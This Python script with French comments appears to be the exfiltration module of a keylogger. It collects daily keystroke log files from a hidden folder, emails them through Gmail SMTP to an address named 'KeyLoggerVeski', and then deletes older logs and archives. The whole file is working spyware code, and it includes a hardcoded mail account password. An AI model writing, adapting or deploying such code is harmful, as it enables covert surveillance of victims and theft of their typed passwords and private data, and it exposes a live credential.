import os
import datetime
import time
import shutil

from others.variables_param import NOM_DOSSIER_SECRET,AR1
if not os.path.exists(AR1):
	os.makedirs(AR1)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')
username = os.getlogin()

###########################################################
     ################### SEND ######################
###########################################################

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders

def email_alert(subject,body,to, liste_file=""):
    msg = MIMEMultipart()
    
    msg['subject'] = subject
    msg['to'] = to
    user = "KeyLoggerVeski@gmail.com"
    
    msg['from'] = user
    password = "sslezqomykvdhggd"
    
    msg.attach(MIMEText(body,'plain'))
    ok = True
    for filename in liste_file:
        if os.path.exists(filename):
            attachment = open(filename,"rb")
            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('content-disposition','attachment; filename=' + filename)
            msg.attach(part)
        else:
            ok = False
            print(filename + " : file not exist")
        
        
    if ok:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(user,password)
        server.send_message(msg)
    
        print("--> ###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
    else:
        print("- ! ###" + subject + " ! not send to KeyLoggerVeski@gmail.com")
    server.quit()
    return ok

def send_log_dossier(dateee):
	global dateheure
	
	dossierhier = NOM_DOSSIER_SECRET+"/"+dateee #le dossier
	nomfile_hier = username + " touch " + dateee + ".txt" #le fichier log
	if os.path.exists(dossierhier):
		
		if not os.path.exists(dossierhier +"/ok_sent.txt"): # si dans le dossier n'a pas été envoyé
			listefichiers = [f"{dossierhier}/{nomfile_hier}"] #le fichier log à envoyé
			
			#colis = AR1 + "/" + dateee + ".zip"		#l'archive de photo à envoyé
			#if os.path.exists(colis):
			#	print("colis",colis)
			#	listefichiers.append(colis)
			
			ok = email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
			
			
			#ok c'est fait, c'est noté
			if ok:
				fichierok = open(dossierhier+"/ok_sent.txt", "a") # ajouter un fichier ok_sent dans le dossier
				fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
				fichierok.close()
				print("## " + dossierhier+"/ok_sent.txt")
		else:
			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")
			
def main_email():
	
    for dos in os.listdir(NOM_DOSSIER_SECRET): #pour tous les dossier du data
        if dos != dateajd and os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos):
            send_log_dossier(dos)	
        else:
             print(f" ! {dos} pas envoyé")	
    print("*fin main_mail*")
###########################################################
     ################### DELETE ######################
###########################################################
def remove_folder(path):

	# removing the folder
	if not shutil.rmtree(path):

		# success message
		print(f"{path} is removed successfully")

	else:

		# failure message
		print(f"Unable to delete the {path}")

def remove_file(path):
	print("*")
	# removing the file
	if not os.remove(path):

		# success message
		print(f"{path} is removed successfully")

	else:

		# failure message
		print(f"Unable to delete the {path}")
	print("***")

def main_delete(maximum):
	global NOM_DOSSIER_SECRET
	listeDossiersDates = [fic for fic in os.listdir(NOM_DOSSIER_SECRET)]
	listeDossiersDates.sort()
	print(" Dossiers presents ",listeDossiersDates)
	listeDossiersSupprimer = []
	n = len(listeDossiersDates)
	cpt = 0
	while n > maximum and cpt < n:
		dossierasuppr = NOM_DOSSIER_SECRET +"/"+ listeDossiersDates[0]
		if os.path.exists(dossierasuppr) and os.path.exists(dossierasuppr +"/ok_sent.txt"):
			remove_folder(dossierasuppr)
			listeDossiersSupprimer.append(dossierasuppr)
		listeDossiersDates = listeDossiersDates[1:]
		n = len(listeDossiersDates)
		cpt += 1
	print(" Dossiers supprimer",listeDossiersSupprimer)
	print(" compteur affiche ",cpt)

def main_delete_ar1(maximum):
	global AR1
	listeDossiersDates = [fic for fic in os.listdir(AR1)]
	listeDossiersDates.sort()
	print(listeDossiersDates)
	listeDossiersSupprimer = []
	n = len(listeDossiersDates)
	while n > maximum:
		dossierasuppr = AR1 +"/"+ listeDossiersDates[0]
		if os.path.exists(dossierasuppr):
			remove_file(dossierasuppr)
			listeDossiersSupprimer.append(dossierasuppr)
		listeDossiersDates = listeDossiersDates[1:]
		n = len(listeDossiersDates)
	print(" AR1 supprimer",listeDossiersSupprimer)

###########################################################
     ################### MZIN ######################
###########################################################	
def TRY_MAIL(n,att):
    if n > 0:
        try:
        	main_email()
        	print(" ----------------------------------------> Yes main_email")
        except:
            print(" ----------------------------------------! ERREUR de main_email")
            time.sleep(att)
            TRY_MAIL(n-1,att)
            
def TRY_DELETE(n,att):
    if n > 0:
        try:
            main_delete(3)
            main_delete_ar1(30)
            print(" ----------------------------------------> Yes main_delete et main_delete_arc")
        except:
            print(" ----------------------------------------! ERREUR de main_delete ou main_delete_arc")
            time.sleep(att)
            TRY_DELETE(n-1,att)            


TRY_MAIL(5,(60*10))    


print("...")
time.sleep(10)

TRY_DELETE(2,15)



#staller = input("\n\n Press ENTER to close")
